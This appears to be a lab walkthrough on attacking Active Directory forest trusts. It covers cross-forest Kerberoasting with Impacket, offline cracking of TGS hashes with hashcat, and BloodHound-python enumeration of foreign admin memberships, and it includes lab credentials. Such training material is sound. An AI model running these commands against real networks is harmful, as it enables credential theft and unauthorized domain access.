In an Active Directory environment, a **forest trust** allows authentication between domains in different forests. If misconfigured, attackers can exploit these trusts to gain unauthorized access.

---
## **1. Kerberoasting Across a Forest Trust**

### **Step 1: Using Impacket’s `GetUserSPNs.py`**

To extract **Service Principal Names (SPNs)** and perform Kerberoasting, use `GetUserSPNs.py` with the `-target-domain` flag.

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

### **Step 2: Requesting a TGS Ticket**

We now request a **Ticket Granting Service (TGS) ticket**, which can be cracked offline.
```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

### **Step 3: Cracking the TGS Hash with Hashcat**

Once we obtain the TGS hash, we can crack it offline using **Hashcat**.
```bash
hashcat -m 13100 -a 0 <HASH_FILE> /usr/share/wordlists/rockyou.txt --force
```

---

## **2. Hunting Foreign Group Membership Using BloodHound**

In a **bidirectional forest trust**, a privileged user from one domain may be a **member of the built-in Administrators group** in the trusted domain. We use **BloodHound-python** to enumerate this.

### **Step 1: Modify `/etc/resolv.conf` for DNS Resolution**

Edit `/etc/resolv.conf` to include the **target domain’s nameserver**.

Add the following lines (example for `INLANEFREIGHT.LOCAL`):
```bash
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```
If targeting `FREIGHTLOGISTICS.LOCAL`:
```bash
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

### **Step 2: Running BloodHound-python**

Run **BloodHound-python** to collect Active Directory data.

#### **Command for INLANEFREIGHT.LOCAL:**
```bash
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```
Command for FREIGHTLOGISTICS.LOCAL:
```bash
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

### **Step 3 Identifying Foreign Group Membership**

1. Open **BloodHound GUI**.
2. Click **Analysis** > **Users with Foreign Domain Group Membership**.
3. Select **Source Domain** as `INLANEFREIGHT.LOCAL`.
4. Look for **privileged users** from `INLANEFREIGHT.LOCAL` with administrative rights in `FREIGHTLOGISTICS.LOCAL`.